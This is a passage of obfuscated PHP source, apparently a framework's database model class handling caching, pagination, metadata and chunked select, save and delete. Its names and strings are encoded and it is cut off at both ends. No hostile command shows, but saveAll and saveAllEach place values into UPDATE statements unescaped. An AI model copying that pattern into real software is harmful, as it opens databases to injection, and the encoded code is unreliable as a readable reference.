$‘ç˜…öó; } protected function _callBefore($ãØÏ¥†, $ƒöŠÁµ) { return $this->cacheCallCheck($ãØÏ¥†, $ƒöŠÁµ, !1); } protected function _callAfter($É º¡˜à, $üÃ®‹ò) { return $this->cacheCallCheck($É º¡˜à, $üÃ®‹ò, !0); } protected function cacheFunctionAlias($îøİƒœ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($øàù¾Âû, $êßå¯Ê, $®µ‰¸™‹ = false) { $§§€ˆ© = $this->cacheFunctionAlias($êßå¯Ê); if (!$§§€ˆ©) { return; } foreach ($§§€ˆ© as $†Ú’Ø‚ä => $ğ‹æ¾ ª) { $Ö–ê°üÕ = $ğ‹æ¾ ª[0]; $³š¢›ı = explode($_SERVER[Ãìšã«™][50], $ğ‹æ¾ ª[1]); if ($øàù¾Âû == $†Ú’Ø‚ä) { return $this->cacheFunctionGet($†Ú’Ø‚ä, $Ö–ê°üÕ); } if ($®µ‰¸™‹ && in_array($øàù¾Âû, $³š¢›ı)) { $this->cacheFunctionClear($†Ú’Ø‚ä, $Ö–ê°üÕ); } } } public function cacheFunctionGet($´ı„¥Ú, $¢ò®“î) { $óıäÇèÈ = $this->cacheKeyMake($´ı„¥Ú, $¢ò®“î); $±ôãŸ‘ = Cache::get($óıäÇèÈ); if (!is_array($±ôãŸ‘)) { $±ôãŸ‘ = call_user_func_array(array($this, $´ı„¥Ú), array($¢ò®“î, !0)); Cache::set($óıäÇèÈ, $±ôãŸ‘); } return $±ôãŸ‘; } public function cacheFunctionClear($›øÁ®ÊÂ, $²¬‹ôÓ) { $‘ÚŠäÅË = $²¬‹ôÓ; if (!is_array($²¬‹ôÓ)) { $‘ÚŠäÅË = array($²¬‹ôÓ); } foreach ($‘ÚŠäÅË as $‹§îÄö›) { $’÷ƒŒÏ­ = $this->cacheKeyMake($›øÁ®ÊÂ, $‹§îÄö›); Cache::remove($’÷ƒŒÏ­); } } private function cacheKeyMake($äš•Ä, $Ô¡Ú áÑ) { $×²À£‘ê =& $_SERVER[Ãìšã«™]; return get_class($this) . $×²À£‘ê[11] . $äš•Ä . $×²À£‘ê[356] . $Ô¡Ú áÑ; } protected function selectPageReset() { $ú«÷Ô«Ş =& $_SERVER[Ãìšã«™]; if (isset($GLOBALS[$ú«÷Ô«Ş[357]])) { return; } $GLOBALS[$ú«÷Ô«Ş[357]] = isset($GLOBALS[$ú«÷Ô«Ş[7]][$ú«÷Ô«Ş[358]]) ? $GLOBALS[$ú«÷Ô«Ş[7]][$ú«÷Ô«Ş[358]] : !1; $GLOBALS[$ú«÷Ô«Ş[359]] = isset($GLOBALS[$ú«÷Ô«Ş[7]][$ú«÷Ô«Ş[348]]) ? $GLOBALS[$ú«÷Ô«Ş[7]][$ú«÷Ô«Ş[348]] : !1; $GLOBALS[$ú«÷Ô«Ş[7]][$ú«÷Ô«Ş[358]] = !1; $GLOBALS[$ú«÷Ô«Ş[7]][$ú«÷Ô«Ş[348]] = !1; } protected function selectPageRestore() { $Í²–ãĞè =& $_SERVER[Ãìšã«™]; if (!isset($GLOBALS[$Í²–ãĞè[357]])) { return; } $GLOBALS[$Í²–ãĞè[7]][$Í²–ãĞè[358]] = $GLOBALS[$Í²–ãĞè[357]]; $GLOBALS[$Í²–ãĞè[7]][$Í²–ãĞè[348]] = $GLOBALS[$Í²–ãĞè[359]]; if ($GLOBALS[$Í²–ãĞè[7]][$Í²–ãĞè[358]] === !1) { unset($GLOBALS[$Í²–ãĞè[7]][$Í²–ãĞè[358]]); } if ($GLOBALS[$Í²–ãĞè[7]][$Í²–ãĞè[348]] === !1) { unset($GLOBALS[$Í²–ãĞè[7]][$Í²–ãĞè[348]]); } unset($GLOBALS[$Í²–ãĞè[357]]); unset($GLOBALS[$Í²–ãĞè[359]]); } protected function selectPage($Œ´ìÁ‚Û = 200, $ÂÒŒŠ¦ğ = 1) { $ õÉòâĞ =& $_SERVER[Ãìšã«™]; global $in; $š´ˆ»³Á = $this->optionsValue(); $‚‰êøÇØ = 50000; $Œ´ìÁ‚Û = isset($in[$ õÉòâĞ[358]]) && $in[$ õÉòâĞ[358]] ? $in[$ õÉòâĞ[358]] : $Œ´ìÁ‚Û; if ($Œ´ìÁ‚Û === -1) { $in[$ õÉòâĞ[358]] = !1; $‚‰êøÇØ = 100000000; $Œ´ìÁ‚Û = $‚‰êøÇØ; } $ƒÕ—›Ë = $š´ˆ»³Á; $ƒÕ—›Ë[$ õÉòâĞ[360]] = array(); $Œ´ìÁ‚Û = intval($Œ´ìÁ‚Û); $Œ´ìÁ‚Û = $Œ´ìÁ‚Û <= 5 ? 5 : ($Œ´ìÁ‚Û >= $‚‰êøÇØ ? $‚‰êøÇØ : $Œ´ìÁ‚Û); $ÂÒŒŠ¦ğ = intval(isset($in[$ õÉòâĞ[348]]) && $in[$ õÉòâĞ[348]] ? $in[$ õÉòâĞ[348]] : $ÂÒŒŠ¦ğ); $ÂÒŒŠ¦ğ = $ÂÒŒŠ¦ğ <= 1 ? 1 : $ÂÒŒŠ¦ğ; $ã²•ñÇ‹ = array(); $×ÂñËİ = 1; if ($ÂÒŒŠ¦ğ == 1 && $×ÂñËİ) { $this->optionsValue($š´ˆ»³Á); $ã²•ñÇ‹ = $this->page($ÂÒŒŠ¦ğ, $Œ´ìÁ‚Û)->select(); $¶‡ÕËœ• = is_array($ã²•ñÇ‹) ? count($ã²•ñÇ‹) : 0; if ($¶‡ÕËœ• < $Œ´ìÁ‚Û) { $ ï¾û–Ò = 1; } else { $this->optionsValue($ƒÕ—›Ë); $¶‡ÕËœ• = intval($this->count()); $ ï¾û–Ò = ceil($¶‡ÕËœ• / $Œ´ìÁ‚Û); } } else { $this->optionsValue($ƒÕ—›Ë); $¶‡ÕËœ• = intval($this->count()); $ ï¾û–Ò = ceil($¶‡ÕËœ• / $Œ´ìÁ‚Û); $ÂÒŒŠ¦ğ = $ÂÒŒŠ¦ğ >= $ ï¾û–Ò ? $ ï¾û–Ò : $ÂÒŒŠ¦ğ; $this->optionsValue($š´ˆ»³Á); $ã²•ñÇ‹ = $this->page($ÂÒŒŠ¦ğ, $Œ´ìÁ‚Û)->select(); } if (!is_array($ã²•ñÇ‹)) { $ã²•ñÇ‹ = array(); } if ($ ï¾û–Ò == 1) { $¶‡ÕËœ• = count($ã²•ñÇ‹); } $¸´Ø”„Ì = array($ õÉòâĞ[361] => array($ õÉòâĞ[362] => $¶‡ÕËœ•, $ õÉòâĞ[358] => $Œ´ìÁ‚Û, $ õÉòâĞ[348] => $ÂÒŒŠ¦ğ, $ õÉòâĞ[363] => $ ï¾û–Ò), $ õÉòâĞ[364] => $ã²•ñÇ‹); return $¸´Ø”„Ì; } protected function checkLength($Ê†îğŸ×, $—çéÙÈÁ = 0, $ŠÑÊì¤¾ = '') { $‡—é¹ =& $_SERVER[Ãìšã«™]; $—çéÙÈÁ = $—çéÙÈÁ ? $—çéÙÈÁ : 65536; if (!$Ê†îğŸ× || strlen($Ê†îğŸ×) < $—çéÙÈÁ) { return; } $ŠÑÊì¤¾ = $ŠÑÊì¤¾ ? $ŠÑÊì¤¾ . $‡—é¹[71] : $‡—é¹[12]; show_json($ŠÑÊì¤¾ . LNG($‡—é¹[365]) . "\50{$—çéÙÈÁ}\51", !1); } protected function metaSet($ı´ùÑ²ø, $¨ÁÀğ = null, $ŞãÉšá™ = null) { $Â…É¢«ˆ =& $_SERVER[Ãìšã«™]; if (!$this->tableMeta || !$ı´ùÑ²ø) { return !1; } $Úü×Àˆğ = $this->tableMeta[$Â…É¢«ˆ[366]]; $û®ğÍµ¹ = $this->tableMeta[$Â…É¢«ˆ[367]]; $Úœ¶¶Ì = Model($û®ğÍµ¹); $»â‘ÒÀÜ = array($Úü×Àˆğ => $ı´ùÑ²ø, $Â…É¢«ˆ[368] => $¨ÁÀğ); if (is_null($¨ÁÀğ)) { return $Úœ¶¶Ì->where(array($Úü×Àˆğ => $ı´ùÑ²ø))->delete(); } if (is_null($ŞãÉšá™) && is_string($¨ÁÀğ)) { return $Úœ¶¶Ì->where($»â‘ÒÀÜ)->delete(); } $ÑŞ£è…¹ = is_array($¨ÁÀğ) ? $¨ÁÀğ : array(); if (is_string($¨ÁÀğ)) { $ÑŞ£è…¹[$¨ÁÀğ] = $ŞãÉšá™; } $™»†Ğæª = array(); foreach ($ÑŞ£è…¹ as $ş›à®ò‰ => $åë¹ÇÕŒ) { if (is_null($åë¹ÇÕŒ) && is_string($ş›à®ò‰)) { $Úœ¶¶Ì->where(array($Úü×Àˆğ => $ı´ùÑ²ø, $Â…É¢«ˆ[368] => $ş›à®ò‰))->delete(); continue; } $this->checkLength($åë¹ÇÕŒ, !1, $û®ğÍµ¹ . $Â…É¢«ˆ[4] . $ş›à®ò‰); $™»†Ğæª[] = array($Úü×Àˆğ => $ı´ùÑ²ø, $Â…É¢«ˆ[95] => $ş›à®ò‰, $Â…É¢«ˆ[369] => $åë¹ÇÕŒ); } $£ÀèÑÂº = $Â…É¢«ˆ[370] . $û®ğÍµ¹; CacheLock::lock($£ÀèÑÂº); $Úœ¶¶Ì->where(array($Úü×Àˆğ => $ı´ùÑ²ø))->addAll($™»†Ğæª, array(), !0); CacheLock::unlock($£ÀèÑÂº); return !0; } public function metaGet($³Ù·ù£÷, $ñ˜¸Ç = false) { $¸éËÄòô =& $_SERVER[Ãìšã«™]; if (!$this->tableMeta) { return array(); } $õÂ÷Ô¯ı = $this->tableMeta[$¸éËÄòô[366]]; $îÀ€©‘º = Model($this->tableMeta[$¸éËÄòô[367]]); if ($ñ˜¸Ç) { $¾¸èä¹ = array($õÂ÷Ô¯ı => $³Ù·ù£÷, $¸éËÄòô[95] => $ñ˜¸Ç); return $îÀ€©‘º->where($¾¸èä¹)->getField($¸éËÄòô[369]); } $¾¸èä¹ = array($õÂ÷Ô¯ı => $³Ù·ù£÷); $ôš¼Ù = $îÀ€©‘º->field($¸éËÄòô[371])->where($¾¸èä¹)->select(); $ôš¼Ù = array_to_keyvalue($ôš¼Ù, $¸éËÄòô[95], $¸éËÄòô[369]); return $ôš¼Ù; } private function checkDataAutoHas($ íÎ®™Ü) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $¦ã£õæÛ) { if (in_array($ íÎ®™Ü, explode($_SERVER[Ãìšã«™][50], $¦ã£õæÛ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$È€ß‰„Ò, $Ôİàöó) { $‚‹“ÓµÂ =& $_SERVER[Ãìšã«™]; if (!is_array($È€ß‰„Ò)) { return; } foreach ($this->dataAuto as $ı½ÉØëá) { $ìÇŠ·´– = $ı½ÉØëá[0]; if (!in_array($Ôİàöó, explode($‚‹“ÓµÂ[50], $ı½ÉØëá[2]))) { continue; } switch (trim($ı½ÉØëá[3])) { case $‚‹“ÓµÂ[316]: case $‚‹“ÓµÂ[317]: $ôÌ€ÙÈ = $ı½ÉØëá[1]; $ö¥İú¦Æ = isset($ı½ÉØëá[4]) ? (array) $ı½ÉØëá[4] : array(); if ($ôÌ€ÙÈ == $‚‹“ÓµÂ[196] && array_key_exists($ìÇŠ·´–, $È€ß‰„Ò)) { if (!$È€ß‰„Ò[$ìÇŠ·´–]) { unset($È€ß‰„Ò[$ìÇŠ·´–]); } break; } if (isset($È€ß‰„Ò[$ìÇŠ·´–])) { array_unshift($ö¥İú¦Æ, $È€ß‰„Ò[$ìÇŠ·´–]); } if ($‚‹“ÓµÂ[316] == $ı½ÉØëá[3]) { $È€ß‰„Ò[$ìÇŠ·´–] = call_user_func_array($ôÌ€ÙÈ, $ö¥İú¦Æ); } else { $È€ß‰„Ò[$ìÇŠ·´–] = call_user_func_array(array(&$this, $ôÌ€ÙÈ), $ö¥İú¦Æ); } break; case $‚‹“ÓµÂ[265]: if (isset($È€ß‰„Ò[$ìÇŠ·´–]) && $È€ß‰„Ò[$ìÇŠ·´–]) { $È€ß‰„Ò[$ìÇŠ·´–] = call_user_func_array(array(&$this, $ı½ÉØëá[1]), array($È€ß‰„Ò[$ìÇŠ·´–])); } break; case $‚‹“ÓµÂ[268]: $È€ß‰„Ò[$ìÇŠ·´–] = $È€ß‰„Ò[$ı½ÉØëá[1]]; break; case $‚‹“ÓµÂ[289]: if (isset($È€ß‰„Ò[$ìÇŠ·´–]) && !is_string($È€ß‰„Ò[$ìÇŠ·´–])) { $È€ß‰„Ò[$ìÇŠ·´–] = json_encode_force($È€ß‰„Ò[$ìÇŠ·´–]); } break; case $‚‹“ÓµÂ[318]: if ($È€ß‰„Ò[$ìÇŠ·´–] === $‚‹“ÓµÂ[12]) { unset($È€ß‰„Ò[$ìÇŠ·´–]); } break; case $‚‹“ÓµÂ[319]: $È€ß‰„Ò[$ìÇŠ·´–] = $ı½ÉØëá[1]; default: break; } } if ($Ôİàöó == $‚‹“ÓµÂ[350]) { $ºşÈŞÒì = strtolower($this->db->getDbType()); if (strpos($ºşÈŞÒì, $‚‹“ÓµÂ[13]) !== 0) { return; } $Õı›™Úâ = $this->field(!0)->fields; $¹£ÅãĞ„ = $Õı›™Úâ[$‚‹“ÓµÂ[247]]; if (isset($Õı›™Úâ[$‚‹“ÓµÂ[246]])) { unset($¹£ÅãĞ„[$Õı›™Úâ[$‚‹“ÓµÂ[246]]]); } foreach ($¹£ÅãĞ„ as $ïĞÂØìÂ => $Ôİàöó) { if (!isset($È€ß‰„Ò[$ïĞÂØìÂ])) { $È€ß‰„Ò[$ïĞÂØìÂ] = $‚‹“ÓµÂ[12]; } } } } private function dataAfterFilter(&$ª¬ŠŠîõ) { $ĞÓúïÖÛ =& $_SERVER[Ãìšã«™]; foreach ($this->dataAuto as $ÉˆØÄ½˜) { $º²û½ÇÛ = $ÉˆØÄ½˜[0]; if (!isset($ª¬ŠŠîõ[$º²û½ÇÛ])) { continue; } if (!in_array($ĞÓúïÖÛ[352], explode($ĞÓúïÖÛ[50], $ÉˆØÄ½˜[2]))) { continue; } switch (trim($ÉˆØÄ½˜[3])) { case $ĞÓúïÖÛ[316]: case $ĞÓúïÖÛ[317]: $°Úˆ¶Í§ = isset($ÉˆØÄ½˜[4]) ? (array) $ÉˆØÄ½˜[4] : array(); array_unshift($°Úˆ¶Í§, $ª¬ŠŠîõ[$º²û½ÇÛ]); if (isset($ÉˆØÄ½˜[4]) && $ÉˆØÄ½˜[4] == $ĞÓúïÖÛ[372]) { $°Úˆ¶Í§ = array($ª¬ŠŠîõ[$º²û½ÇÛ]); } if ($ĞÓúïÖÛ[316] == $ÉˆØÄ½˜[3]) { $ª¬ŠŠîõ[$º²û½ÇÛ] = call_user_func_array($ÉˆØÄ½˜[1], $°Úˆ¶Í§); } else { $ª¬ŠŠîõ[$º²û½ÇÛ] = call_user_func_array(array(&$this, $ÉˆØÄ½˜[1]), $°Úˆ¶Í§); } break; case $ĞÓúïÖÛ[265]: if (isset($ª¬ŠŠîõ[$º²û½ÇÛ]) && $ª¬ŠŠîõ[$º²û½ÇÛ]) { $ª¬ŠŠîõ[$º²û½ÇÛ] = call_user_func_array(array(&$this, $ÉˆØÄ½˜[1]), array($ª¬ŠŠîõ[$º²û½ÇÛ])); } break; case $ĞÓúïÖÛ[268]: $ª¬ŠŠîõ[$º²û½ÇÛ] = $ª¬ŠŠîõ[$ÉˆØÄ½˜[1]]; break; case $ĞÓúïÖÛ[289]: $†€ÁÌÍ = $ª¬ŠŠîõ[$º²û½ÇÛ]; $ª¬ŠŠîõ[$º²û½ÇÛ] = json_decode($†€ÁÌÍ, !0); if (is_null($ª¬ŠŠîõ[$º²û½ÇÛ])) { $ª¬ŠŠîõ[$º²û½ÇÛ] = $†€ÁÌÍ; } break; case $ĞÓúïÖÛ[318]: if ($ª¬ŠŠîõ[$º²û½ÇÛ] === $ĞÓúïÖÛ[12]) { unset($ª¬ŠŠîõ[$º²û½ÇÛ]); } break; case $ĞÓúïÖÛ[319]: $ª¬ŠŠîõ[$º²û½ÇÛ] = $ÉˆØÄ½˜[1]; break; default: break; } } } public function saveAll($ï›á–¯¥) { $û×Îóì =& $_SERVER[Ãìšã«™]; $Î¶©ú¿ù = $this->tablePrefix . $this->tableName; $¬…ó×ô = self::SQL_WHERE_IN_CHUNK; $ï›á–¯¥ = is_array($ï›á–¯¥) ? $ï›á–¯¥ : array(); $Ÿ½õ·Åî = $û×Îóì[373]; $Ÿ×ÜÍó = 0; $İ‹±êÉ = array(); $å¶ëĞĞ¯ = count($ï›á–¯¥); for ($¯Ú³¾í‘ = 0; $¯Ú³¾í‘ < $å¶ëĞĞ¯; $¯Ú³¾í‘++) { $Ïöò›¦ü = $ï›á–¯¥[$¯Ú³¾í‘]; if (!is_array($Ïöò›¦ü) || count($Ïöò›¦ü) != 4) { continue; } $€Ì‚è = "\125\120\x44\x41\x54\105\40\x60{$Î¶©ú¿ù}\140\x20\123\105\124\x20{$Ïöò›¦ü[2]}\40\75\x20\103\101\x53\x45\40{$Ïöò›¦ü[0]}\x20\12"; if ($Ÿ×ÜÍó == 0) { $Ÿ½õ·Åî = $€Ì‚è; } $İ‹±êÉ[] = $û×Îóì[117] . $Ïöò›¦ü[1] . $û×Îóì[117]; $Ÿ×ÜÍó++; $Ÿ½õ·Åî .= "\40\x57\110\105\x4e\40\x27{$Ïöò›¦ü[1]}\x27\x20\124\x48\x45\x4e\40\x27{$Ïöò›¦ü[3]}\47\x20\12"; if ($Ÿ×ÜÍó == $¬…ó×ô || $¯Ú³¾í‘ == $å¶ëĞĞ¯ - 1) { $¯•ŸàÑ“ = implode($û×Îóì[50], $İ‹±êÉ); $Ÿ½õ·Åî .= "\x20\105\116\104\40\40\x57\110\x45\122\105\x20{$Ïöò›¦ü[0]}\40\x49\116\x20\50{$¯•ŸàÑ“}\51\x20"; $this->execute($Ÿ½õ·Åî); $Ÿ×ÜÍó = 0; $Ÿ½õ·Åî = $€Ì‚è; $this->chunkEventCheck(count($İ‹±êÉ)); $İ‹±êÉ = array(); } } $this->chunkEventSet(); } public function saveAllEach($…óÜıì) { $®Ñıâã± =& $_SERVER[Ãìšã«™]; $¿¶˜Ìîà = $this->tablePrefix . $this->tableName; foreach ($…óÜıì as $ì•Ë¢¤™) { if (!is_array($ì•Ë¢¤™) || count($ì•Ë¢¤™) != 4) { continue; } $äğğ¦ô— = $ì•Ë¢¤™[0] . $®Ñıâã±[374] . $ì•Ë¢¤™[1] . $®Ñıâã±[117]; $£Ëˆ¼¶ = $ì•Ë¢¤™[2] . $®Ñıâã±[374] . $ì•Ë¢¤™[3] . $®Ñıâã±[117]; $˜¦°ÅãÉ = "\x75\160\144\x61\x74\x65\x20{$¿¶˜Ìîà}\40\163\145\x74\40{$£Ëˆ¼¶}\40\x77\x68\145\x72\x65\40{$äğğ¦ô—}\73"; $this->execute($˜¦°ÅãÉ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¼£Ãø—› = false, $‹º¬Ûß = false) { $this->_chunkEvent = $¼£Ãø—›; $this->_chunkEventParam = $‹º¬Ûß; } private function chunkEventCheck($ÉÅ–ÙÃÎ) { if (!$this->_chunkEvent) { return; } $ƒ§Çâä¯ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ƒ§Çâä¯[$_SERVER[Ãìšã«™][375]] = $ÉÅ–ÙÃÎ; Hook::trigger($this->_chunkEvent, $ƒ§Çâä¯); } public function addAll($ú…ñäŸ´, $‹³¤ÍÓË = array(), $ÖéüÖ¯¦ = false) { $ŠÄ‘Ìâ‘ =& $_SERVER[Ãìšã«™]; ignore_timeout(); $ïÛ¼¿Ñ¼ = self::SQL_WHERE_IN_CHUNK; if (empty($ú…ñäŸ´)) { $this->error = think_lang($ŠÄ‘Ìâ‘[266]); return !1; } $‹³¤ÍÓË = $this->_parseOptions($‹³¤ÍÓË); foreach ($ú…ñäŸ´ as $´·ÁÁÓ‡ => $æÓ—øæ¶) { $ú…ñäŸ´[$´·ÁÁÓ‡] = $this->_facade($æÓ—øæ¶); $this->_beforeInsert($ú…ñäŸ´[$´·ÁÁÓ‡], $‹³¤ÍÓË); } if (method_exists($this->db, $ŠÄ‘Ìâ‘[267])) { for ($–€¤áù¦ = 0; $–€¤áù¦ < count($ú…ñäŸ´); $–€¤áù¦ += $ïÛ¼¿Ñ¼) { $†ó«Ç¯ = array_slice($ú…ñäŸ´, $–€¤áù¦, $ïÛ¼¿Ñ¼); if (!is_array($†ó«Ç¯) || count($†ó«Ç¯) == 0) { break; } $™¦µí€ß = $this->db->insertAll($†ó«Ç¯, $‹³¤ÍÓË, $ÖéüÖ¯¦); $this->chunkEventCheck(count($†ó«Ç¯)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ú…ñäŸ´ as $´·ÁÁÓ‡ => $æÓ—øæ¶) { $™¦µí€ß = $this->db->insert($æÓ—øæ¶, $‹³¤ÍÓË, $ÖéüÖ¯¦); } $this->commit(); } if (!1 !== $™¦µí€ß) { $‘”ÖÛ’Ç = $this->getLastInsID(); if ($‘”ÖÛ’Ç) { return $‘”ÖÛ’Ç; } } return $™¦µí€ß; } public function save($Ú—Õ± = '', $é—ºüÈ– = array()) { $°ë¿ˆÚ =& $_SERVER[Ãìšã«™]; $¾€ùÅ = self::SQL_WHERE_IN_CHUNK; $ÜÓ¢³¹¼ = $this->optionsValue(); $†…«î¿Ö = $this->findWhereField($ÜÓ¢³¹¼); if (!$†…«î¿Ö) { return parent::save($Ú—Õ±, $é—ºüÈ–); } $õ¿šÂè = 0; $ŸØúãòº = $ÜÓ¢³¹¼[$°ë¿ˆÚ[270]][$†…«î¿Ö][1]; $ŸØúãòº = is_array($ŸØúãòº) ? $ŸØúãòº : array(); $ì¢Ï—‰æ = count($ŸØúãòº); for ($Áä¹•Û = 0; $Áä¹•Û < $ì¢Ï—‰æ; $Áä¹•Û += $¾€ùÅ) { $¾æÂ¸¤Ó = array_slice($ŸØúãòº, $Áä¹•Û, $¾€ùÅ); if (!is_array($¾æÂ¸¤Ó) || count($¾æÂ¸¤Ó) == 0) { break; } $ÜÓ¢³¹¼[$°ë¿ˆÚ[270]][$†…«î¿Ö][1] = $¾æÂ¸¤Ó; $this->optionsValue($ÜÓ¢³¹¼); $õ¿šÂè += parent::save($Ú—Õ±, $é—ºüÈ–); $this->chunkEventCheck(count($¾æÂ¸¤Ó)); } $this->chunkEventSet(); return $õ¿šÂè; } public function add($ï»§µŒç = '', $â»û”§Ù = array(), $Ìüâ½¥º = false) { if ($this->addTaskStatus && is_array($ï»§µŒç)) { $this->addTaskData[] = $ï»§µŒç; return; } return parent::add($ï»§µŒç, $â»û”§Ù, $Ìüâ½¥º); } public function parseWhereLike($ö¡óªëà, $ş·¹Å¡ = '', $™†ä¥´ = false, &$¨µáÔÛ¶ = false) { $Å“Áı‘Ş =& $_SERVER[Ãìšã«™]; $­ùşí± = $GLOBALS[$Å“Áı‘Ş[6]][$Å“Áı‘Ş[376]]; if (!$­ùşí±[$Å“Áı‘Ş[377]]) { return $ö¡óªëà; } if (!is_array($ö¡óªëà)) { return $ö¡óªëà; } $ÄÔëùõ¨ = array(); $œÄÏ©À¢ = 0; foreach ($ö¡óªëà as $¨¦…ûĞ’ => $°€ß£œ¢) { if (is_array($°€ß£œ¢) && count($°€ß£œ¢) == 2 && $°€ß£œ¢[0] == $Å“Áı‘Ş[378] && is_string($°€ß£œ¢[1]) && substr($°€ß£œ¢[1], 0, 1) == $Å“Áı‘Ş[379] && substr($°€ß£œ¢[1], strlen($°€ß£œ¢[1]) - 1, 1) == $Å“Áı‘Ş[379]) { $¨µáÔÛ¶ = !0; $ÎÂá¼ºê = is_string($¨¦…ûĞ’) ? $¨¦…ûĞ’ : $ş·¹Å¡; $©Ğ²¼£ = substr($°€ß£œ¢[1], 1, strlen($°€ß£œ¢[1]) - 2); $©Ğ²¼£ = $this->db->escapeString($©Ğ²¼£); if (!strpos($ÎÂá¼ºê, $Å“Áı‘Ş[10])) { $ÎÂá¼ºê = $Å“Áı‘Ş[380] . $ÎÂá¼ºê . $Å“Áı‘Ş[380]; } $˜èÔ„ëÔ = $Å“Áı‘Ş[181] . $©Ğ²¼£ . $Å“Áı‘Ş[181]; if ($­ùşí±[$Å“Áı‘Ş[381]]) { $˜èÔ„ëÔ = $Å“Áı‘Ş[382] . $©Ğ²¼£ . $Å“Áı‘Ş[383]; if ($­ùşí±[$Å“Áı‘Ş[384]]) { $˜èÔ„ëÔ = $Å“Áı‘Ş[383] . $©Ğ²¼£ . $Å“Áı‘Ş[382]; } } $ÄÔëùõ¨[$œÄÏ©À¢] = $Å“Áı‘Ş[385] . $ÎÂá¼ºê . $Å“Áı‘Ş[386] . $˜èÔ„ëÔ . $Å“Áı‘Ş[387]; $œÄÏ©À¢++; continue; } if (is_array($°€ß£œ¢)) { $ş·¹Å¡ = is_string($¨¦…ûĞ’) ? $¨¦…ûĞ’ : $ş·¹Å¡; $°€ß£œ¢ = $this->parseWhereLike($°€ß£œ¢, $ş·¹Å¡, !0, $¨µáÔÛ¶); } if (is_numeric($¨¦…ûĞ’)) { $ÄÔëùõ¨[$œÄÏ©À¢] = $°€ß£œ¢; $œÄÏ©À¢++; } else { $ÄÔëùõ¨[$¨¦…ûĞ’] = $°€ß£œ¢; } } if ($¨µáÔÛ¶ && !$™†ä¥´) { } return $ÄÔëùõ¨; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ğİ‡à÷¢ = array()) { $â¶µ¢–Î =& $_SERVER[Ãìšã«™]; $ë‰§â¤Ü = self::SQL_WHERE_IN_CHUNK; $õç£–×¶ = $this->optionsValue(); $ğ¡Í–´ = $this->findWhereField($õç£–×¶); if (!$ğ¡Í–´ || isset($õç£–×¶[$â¶µ¢–Î[287]]) || isset($õç£–×¶[$â¶µ¢–Î[348]])) { return parent::select($ğİ‡à÷¢); } $ÒŒ¢¤ŠØ = $õç£–×¶[$â¶µ¢–Î[270]][$ğ¡Í–´][1]; $ÒŒ¢¤ŠØ = is_array($ÒŒ¢¤ŠØ) ? $ÒŒ¢¤ŠØ : array(); $àŠ¨úöÊ = null; for ($šÇÒó‹ñ = 0; $šÇÒó‹ñ < count($ÒŒ¢¤ŠØ); $šÇÒó‹ñ += $ë‰§â¤Ü) { $Ô†éİÊ’ = array_slice($ÒŒ¢¤ŠØ, $šÇÒó‹ñ, $ë‰§â¤Ü); if (!is_array($Ô†éİÊ’) || count($Ô†éİÊ’) == 0) { break; } $õç£–×¶[$â¶µ¢–Î[270]][$ğ¡Í–´][1] = $Ô†éİÊ’; $this->optionsValue($õç£–×¶); $Õû¹Ã«‚ = parent::select($ğİ‡à÷¢); if (!$Õû¹Ã«‚) { continue; } $àŠ¨úöÊ = is_array($àŠ¨úöÊ) ? $àŠ¨úöÊ : array(); $àŠ¨úöÊ = array_merge($àŠ¨úöÊ, $Õû¹Ã«‚); } return $àŠ¨úöÊ; } public function delete($¢ÏéøŸì = array()) { $üŒô›Ç» =& $_SERVER[Ãìšã«™]; $¶åõ´ıÚ = self::SQL_WHERE_IN_CHUNK; $‹ëï‰Ë = $this->optionsValue(); $« ©™İÚ = $this->findWhereField($‹ëï‰Ë); if (!$« ©™İÚ) { return parent::delete($¢ÏéøŸì); } $Æ’·‹È = 0; $©ıï¿ÑÑ = $‹ëï‰Ë[$üŒô›Ç»[270]][$« ©™İÚ][1]; $©ıï¿ÑÑ = is_array($©ıï¿ÑÑ) ? $©ıï¿ÑÑ : array(); for ($™ĞîÓâœ = 0; $™ĞîÓâœ < count($©ıï¿ÑÑ); $™ĞîÓâœ += $¶åõ´ıÚ) { $Õƒ­¾ = array_slice($©ıï¿ÑÑ, $™ĞîÓâœ, $¶åõ´ıÚ); if (!is_array($Õƒ­¾) || count($Õƒ­¾) == 0) { break; } $‹ëï‰Ë[$üŒô›Ç»[270]][$« ©™İÚ][1] = $Õƒ­¾; $this->optionsValue($‹ëï‰Ë); $Æ’·‹È += parent::delete($¢ÏéøŸì); } return $Æ’·‹È; } private function findWhereField($³…É¤ï¦) { $Øûì§¾Ù =& $_SERVER[Ãìšã«™]; $İƒ·¬ì = self::SQL_WHERE_IN_CHUNK; if (!is_array($³…É¤ï¦) || !is_array($³…É¤ï¦[$Øûì§¾Ù[270]])) { return !1; } foreach ($³…É¤ï¦[$Øûì§¾Ù[270]] as $¤±…ÉÉ‚ => $ŸÙ—Ü®á) { if (is_array($ŸÙ—Ü®á) && isset($ŸÙ—Ü®á[0]) && is_string($ŸÙ—Ü®á[0]) && strtolower($ŸÙ—Ü®á[0]) == $Øûì§¾Ù[7] && is_array($ŸÙ—Ü®á[1]) && count($ŸÙ—Ü®á[1]) > $İƒ·¬ì) { ignore_timeout(); return $¤±…ÉÉ‚; } } return !1; } public function setMasterDB($É§ôƒÍË = true) { think_config($_SERVER[Ãìšã«™][388], $É§ôƒÍË); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\164\145\155\x4f\160\x74\x69\x6f\156"; public $field = array(); public function listData($¢‡àü— = false, $™íÏ©•€ = "\155\157\144\x69\146\x79\x54\x69\x6d\145", $Œï¢°Óô = false) { $û×‹äûŠ = Model($this->modelType)->get(!1, $this->optionType, !0); $ÃÃä²Š¡ = array_values($û×‹äûŠ); if ($ÃÃä²Š¡ && $ÃÃä²Š¡[0] && !is_array($ÃÃä²Š¡[0])) { Model($this->modelType)->cacheRemove($this->optionType); $û×‹äûŠ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$û×‹äûŠ) { return $¢‡àü— ? null : array(); } if (!$¢‡àü—) { 